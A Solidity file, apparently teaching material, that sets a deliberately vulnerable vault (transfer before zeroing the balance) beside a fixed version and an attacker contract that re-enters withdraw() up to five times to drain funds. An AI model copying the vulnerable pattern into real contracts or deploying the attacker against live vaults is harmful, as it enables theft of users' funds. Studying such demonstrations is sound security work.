// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

/// @notice 故意保留 Checks-Effects-Interactions 漏洞：先转账，后清零。
contract VulnerableVault {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Vault: nothing to withdraw");

        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "Vault: send failed");

        balances[msg.sender] = 0;
    }

    function vaultBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/// @notice 修复版：先清零余额，再外部调用。
contract FixedVault {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Vault: nothing to withdraw");

        balances[msg.sender] = 0;

        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "Vault: send failed");
    }

    function vaultBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/// @notice 攻击合约：收到退款时再次调用 withdraw。
contract Attacker {
    IVault public immutable vault;
    uint256 public attackAmount;
    uint256 public count;

    event Reentered(uint256 count, uint256 vaultBalance);

    constructor(address _vault) {
        require(_vault != address(0), "Attacker: zero vault");
        vault = IVault(_vault);
    }

    function attack() external payable {
        require(msg.value > 0, "Attacker: need seed ether");
        attackAmount = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        require(msg.sender == address(vault), "Attacker: only vault");
        if (address(vault).balance >= attackAmount && count < 5) {
            count++;
            emit Reentered(count, address(vault).balance);
            vault.withdraw();
        }
    }
}
